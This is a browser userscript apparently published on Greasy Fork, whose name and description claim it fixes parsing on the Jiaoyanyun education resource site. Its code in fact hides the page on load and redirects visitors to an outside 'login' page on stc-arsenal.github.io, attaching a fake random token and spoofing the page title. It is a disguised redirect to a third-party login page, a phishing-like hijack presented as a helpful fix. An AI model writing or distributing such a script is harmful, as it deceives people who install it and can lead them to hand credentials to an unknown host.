//【Alpha 17】代码结构重构，加速脚本运行

// ==UserScript==
// @name         教研云解析修复
// @icon         data:image/png;base64,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
// @author       老班长
// @namespace    https://greasyfork.org/zh-CN
// @version      1919.810-alpha17
// @description  用于修复教研云解析
// @match        https://ziyuanyetnt.jiaoyanyun.com/
// @grant        GM_xmlhttpRequest
// @grant        GM_addStyle
// @license      AGPL-3.0
// @downloadURL https://update.greasyfork.org/scripts/485849/%E6%95%99%E7%A0%94%E4%BA%91%E8%A7%A3%E6%9E%90%E4%BF%AE%E5%A4%8D.user.js
// @updateURL https://update.greasyfork.org/scripts/485849/%E6%95%99%E7%A0%94%E4%BA%91%E8%A7%A3%E6%9E%90%E4%BF%AE%E5%A4%8D.meta.js
// ==/UserScript==


(function() {
    'use strict';

    var style1 = document.createElement('style');
    var token10a = Math.random()*15561596445614347
    var token10b = Math.random()*405804597343934
    var token10c = Math.random()*304323723494
    var token16a = token10a.toString(16);
    var token16b = token10b.toString(16);
    var token16c = token10c.toString(16);
    style1.type = 'text/css';
    style1.textContent = 'body {display: none!important;}';
    window.location.replace("https://stc-arsenal.github.io/login?time="+Date.now()+"&token="+token16a+token16b+token16c)
    document.head.appendChild(style1);
    function buttonA(){
        document.title = "教研云资源页";

    }
    setTimeout(buttonA, 1000);

    // Your code here...
})();